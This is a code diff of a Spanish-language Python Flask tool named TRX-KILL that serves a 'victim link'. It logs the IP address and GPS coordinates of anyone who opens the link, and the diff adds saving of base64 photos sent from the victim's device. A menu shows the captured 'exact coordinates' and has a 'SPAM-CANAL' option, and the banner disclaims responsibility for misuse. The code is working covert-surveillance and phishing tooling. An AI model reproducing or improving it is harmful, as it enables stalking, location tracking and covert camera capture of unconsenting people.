@@ -30,61 +30,74 @@ def index():
 
 @app.route('/log', methods=['POST'])
 def log():
-    lat, lon = request.args.get('lat'), request.args.get('lon')
+    lat = request.args.get('lat', '0')
+    lon = request.args.get('lon', '0')
+    ip = request.remote_addr
+    data = request.get_json()
     with open(LOG_FILE, "a") as f:
-        f.write(f"LAT:{lat}|LON:{lon}|TIME:{time.ctime()}\n")
+        f.write(f"IP:{ip}|LAT:{lat}|LON:{lon}|TIME:{time.ctime()}\n")
+    if data and 'i' in data:
+        with open(f"{STORAGE_PATH}/foto_{int(time.time())}.png", "wb") as f:
+            f.write(base64.b64decode(data['i'].split(',')[1]))
     return "OK"
 
 def banner():
     os.system('clear')
     print(f"\033[1;32m")
-    print(" -------->-TRX-KILL -<-----------")
-    print(" -CREADOR: TRX-KILL")
-    print(" -VERCION: 1.4.5")
-    print(" -BIENVENIDO A TRX-KILL UN SCRIP PROTEGIDO POR EL OSINT.")
-    print(" -EL CREADOR NO SE ASE RESPONSABLE POR SU MAL USO.\n")
-    print(" OPCIONES\033[0m")
+    print("  -------->-TRX-KILL -<-----------")
+    print("  -CREADOR: TRX-KILL")
+    print("  -VERCION: 1.4.5")
+    print("  -BIENVENIDO A TRX-KILL UN SCRIP PROTEGIDO POR EL OSINT.")
+    print("  -EL CREADOR NO SE ASE RESPONSABLE POR SU MAL USO.\n")
+    print("  OPCIONES\033[0m")
 
 def main():
     threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False), daemon=True).start()
     
     while True:
         banner()
-        print(" [1] NÚMERO INFORMACIÓN  | [2] LINK-ZP         | [3] CREADOR")
-        print(" [4] VERSIONES           | [5] ANALIZAR LINK   | [6] ADM SISTEMA")
-        print(" [7] INFO SCRIPT         | [8] REPOSITORIO     | [10] SPAM-CANAL")
-        print(" [0] SALIR")
+        print("  [1] NÚMERO INFORMACIÓN")
+        print("  [2] LINK-ZP")
+        print("  [3] CREADOR")
+        print("  [4] VERSIONES")
+        print("  [5] ANALIZAR LINK")
+        print("  [6] ADM SISTEMA")
+        print("  [7] INFO SCRIPT")
+        print("  [8] REPOSITORIO")
+        print("  [9] PROCESOS")
+        print("  [10] SPAM-CANAL")
+        print("  [0] SALIR")
         sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
 
         if sel == "1":
             print("\n----1----\nINGRESAR NÚMERO:")
             input()
-            print("VERIFICANDO DATOS......")
-            time.sleep(2)
-            if os.path.exists(LOG_FILE):
+            print("VERIFICANDO DATOS...")
+            # Validación mejorada para evitar el error de índice
+            if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
                 with open(LOG_FILE, 'r') as f:
                     lines = f.readlines()
-                    if lines:
-                        last = lines[-1].strip().split('|')
-                        print(f"DATOS ENCONTRADOS; BY TRX-KILL\nPAÍS: [DETECTADO] | OPERADOR: [MOVIL]")
-                        print(f"COORDENADAS EXACTAS: {last[0].replace('LAT:', '')}, {last[1].replace('LON:', '')}")
-                    else: print("NO HAY DATOS REGISTRADOS.")
-            else: print("NO HAY DATOS.")
+                    last = lines[-1].strip().split('|')
+                    if len(last) >= 3:
+                        print(f"DATOS ENCONTRADOS:\nPAÍS: [DETECTADO]\nCOORDENADAS: {last[1].replace('LAT:', '')}, {last[2].replace('LON:', '')}")
+                    else: print("DATOS INCOMPLETOS EN EL LOG.")
+            else: print("NO HAY DATOS REGISTRADOS TODAVÍA.")
             input("\n[Enter]...")
-            
         elif sel == "2":
-            print("\n---2---\nLINK VICTIMA: http://127.0.0.1:5000")
-            print("ESPERANDO QUE EL USUARIO ENTRE...")
+            print("\n----2----\nLINK VÍCTIMA: http://127.0.0.1:5000\nESPERANDO CONEXIÓN...")
             input("\n[Enter]...")
-            
+        elif sel == "3": print("\n----3----\n#CREADO POR: OSCAR"); input()
+        elif sel == "4": print("\n----4----\nVERSIÓN: 1.4.5"); input()
+        elif sel == "5": print("\n----5----\nANALIZANDO LINK..."); input()
         elif sel == "6":
-            if getpass.getpass("KEY: ") == AUTH_PASS:
+            if getpass.getpass("INGRESAR KEY: ") == AUTH_PASS:
                 if os.path.exists(LOG_FILE): os.system(f"cat {LOG_FILE}")
                 else: print("NO HAY DATOS.")
-            else: print("KEY INCORRECTA")
-            input("\n[Enter]...")
-            
+            input()
+        elif sel == "7": print("\n----7----\nEL CREADOR NO SE HACE RESPONSABLE."); input()
+        elif sel == "8": print("\n----8----\nREPOSITORIO..."); input()
+        elif sel == "9": print("\n----9----\nPROCESOS TRX: ACTIVO"); input()
+        elif sel == "10": print("\n----10----\nSPAM-CANAL ACTIVADO"); input()
         elif sel == "0": sys.exit()
-        else: time.sleep(0.5)
 
 if __name__ == "__main__": main()
